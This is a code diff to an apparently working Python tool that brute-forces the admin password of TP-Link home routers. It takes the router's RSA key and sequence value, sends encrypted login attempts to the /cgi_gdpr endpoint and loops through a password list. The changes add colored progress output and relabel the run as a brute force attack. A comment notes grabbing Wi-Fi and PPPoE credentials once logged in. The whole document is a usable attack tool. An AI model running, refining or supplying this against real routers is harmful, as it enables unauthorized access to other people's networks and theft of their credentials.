@@ -4,11 +4,12 @@ import typing
 import hashlib
 import base64
 import sys
-
+from colors import colors
 import tp_link_crypto
 
 
 DEBUG: bool = False
+VERBOSE: bool = False
 USERNAME: str = "admin"  # Hardcoded in the router
 USER_AGENT: str = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0"
 AES_KEY: str = "A" * 16
@@ -16,6 +17,9 @@ AES_IV: str = "B" * 16
 
 def print_d(msg: str) -> None:
     if DEBUG:
+        print(msg)
+def print_v(msg: str) -> None:
+    if VERBOSE:
         print(msg)
 
 
@@ -36,30 +40,30 @@ def get_rsa_public_key(s: requests.Session, ip_addr: str) -> typing.Union[typing
     }
     data = "[/cgi/getParm#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n"
     resp = s.post(f"http://{ip_addr}/cgi?8", headers=headers, data=data)
-    # print_d(resp.headers)
-    # print_d(resp.text)
+    print_d(f"{colors['Blue']}[*] {resp.headers}{colors['Color_Off']}")
+    print_d(f"{colors['Blue']}[*] {resp.text}{colors['Color_Off']}")
 
     # Get the RSA public key (i.e. n and e values)
     match = re.search("nn=\"(.+)\"", resp.text)
     if not match:
-        print("[-] Could not find RSA n value in get RSA public key response")
+        print(f"{colors['Red']}[-] {colors['Yellow']}Could not find RSA n value in get RSA public key response{colors['Color_Off']}")
         return None
     n_bytes = match.group(1)
-    # print(f"[+] RSA n: {n_bytes}")
+    print_v(f"{colors['Green']}[+] {colors['Yellow']}RSA n: {colors['Cyan']}{n_bytes}{colors['Color_Off']}")
     match = re.search("ee=\"(.+)\"", resp.text)
     if not match:
-        print("[-] Could not find RSA e value in get RSA public key response")
+        print(f"{colors['Red']}[-] {colors['Yellow']}Could not find RSA e value in get RSA public key response{colors['Color_Off']}")
         return None
     e_bytes = match.group(1)
-    # print(f"[+] RSA e: {e_bytes}")
+    print_v(f"{colors['Green']}[+] {colors['Yellow']}RSA e: {colors['Cyan']}{e_bytes}{colors['Color_Off']}")
 
     # Get the sequence. This is set to sequence += data_len and verified server-side.
     match = re.search("seq=\"(.+)\"", resp.text)
     if not match:
-        print("[-] Could not find seq value in get RSA public key response")
+        print(f"{colors['Red']}[-] {colors['Yellow']}Could not find seq value in get RSA public key response{colors['Color_Off']}")
         return None
     seq_bytes = match.group(1)
-    # print(f"[+] Sequence: {seq_bytes}")
+    print_v(f"{colors['Green']}[+] {colors['Yellow']}Sequence: {seq_bytes}{colors['Color_Off']}")
 
     e = int(e_bytes, 16)
     n = int(n_bytes, 16)
@@ -79,7 +83,7 @@ def authenticate(s: requests.Session, ip_addr: str, password: str) -> bool:
     # Get the RSA public key parameters and the sequence
     rsa_vals = get_rsa_public_key(s, ip_addr)
     if rsa_vals is None:
-        print("[-] Failed to get RSA public key and sequence values")
+        print(f"{colors['Red']}[-] {colors['Yellow']}Failed to get RSA public key and sequence values{colors['Color_Off']}")
         return False
     e, n, seq = rsa_vals
 
@@ -116,13 +120,13 @@ def authenticate(s: requests.Session, ip_addr: str, password: str) -> bool:
     try:
         resp = s.post(f"http://{ip_addr}/cgi_gdpr", headers=headers, data=request_data)
     except:
-        print("[-] GDPR endpoint not found.")
+        print(f"{colors['Red']}[-] {colors['Yellow']}GDPR endpoint error.{colors['Color_Off']}")
         return False
 
     # Get the session cookie
     cookie = resp.headers["Set-Cookie"]
     if cookie is None:
-        print("[-] Login response did not include a Set-Cookie field in the header")
+        print(f"{colors['Red']}[-] {colors['Yellow']}Login response did not include a Set-Cookie field in the header{colors['Color_Off']}")
         return False
     # Example of the cookie field:
     # ```
@@ -131,10 +135,10 @@ def authenticate(s: requests.Session, ip_addr: str, password: str) -> bool:
     # Get the JSESSIONID field because it's used during other requests.
     match = re.search(r"JSESSIONID=([a-z0-9]+)", cookie)
     if not match:
-        print("[-] Could not find the JSESSIONID in the Set-Cookie filed of the login response")
+        print(f"{colors['Red']}[-] {colors['Yellow']}Could not find the JSESSIONID in the Set-Cookie filed of the login response{colors['Color_Off']}")
         return False
     jsessionid = match.group(1)
-    print(f"[+] JSESSIONID: {jsessionid}")
+    print_v(f"{colors['Green']}[+] {colors['Yellow']}JSESSIONID: {colors['Cyan']}{jsessionid}{colors['Color_Off']}")
 
     # Decode the Base64 encoded response
     decoded: bytes = base64.b64decode(resp.text)
@@ -147,7 +151,6 @@ def authenticate(s: requests.Session, ip_addr: str, password: str) -> bool:
     decrypted_resp_str: str = decrypted_resp.decode()
     # print_d(decrypted_resp_str)
     if "[cgi]0" in decrypted_resp_str and "$.ret=0" in decrypted_resp_str and "[error]0" in decrypted_resp_str:
-        print("[+] Successfully authenticated with the router")
         # get ssid and password also wan PPPoE username and password
         return True
 
@@ -158,23 +161,22 @@ def authenticate(s: requests.Session, ip_addr: str, password: str) -> bool:
         # $.ret=0;
         # [error]0
         # ```
-        print("[-] Unknown response message from router")
+        print(f"{colors['Red']}[-] {colors['Yellow']}Unknown response message from router{colors['Color_Off']}")
         print(decrypted_resp_str)
 
     return True
 
 
 def tp_bruter(ip_addr: str, passList: list) -> int:
-    print(f"[*] Connecting to router at {ip_addr}")
-
+    print(f"{colors['Blue']}[*]{colors['Color_Off']} Starting brute force attack on {colors['Blue']}TP-Link router{colors['Color_Off']}")
     s = requests.Session()
     for count, password in enumerate(passList):
         success = authenticate(s, ip_addr, password)
         if not success:
-            print(f"[-] Failed : {password}")
-            print(f"[*] Progress: {(count/len(passList))*100}% ({count}/{len(passList)})")
+            print(f"{colors['Red']}[-]{colors['Yellow']} Failed '{colors['Purple']}{password}{colors['Color_Off']}'")
+            print(f"{colors['Blue']}[*] {colors['Yellow']}Progress: {colors['Blue']}{(count/len(passList))*100}% ({colors['Green']}{count}/{colors['Cyan']}{len(passList)}){colors['Color_Off']}")
         else:
-            print(f"[+] Successful! : {password}")
+            print(f"{colors['Green']}[+] Password found! '{colors['Purple']}{password}{colors['Color_Off']}'")
             return password
     s.close()
     return False
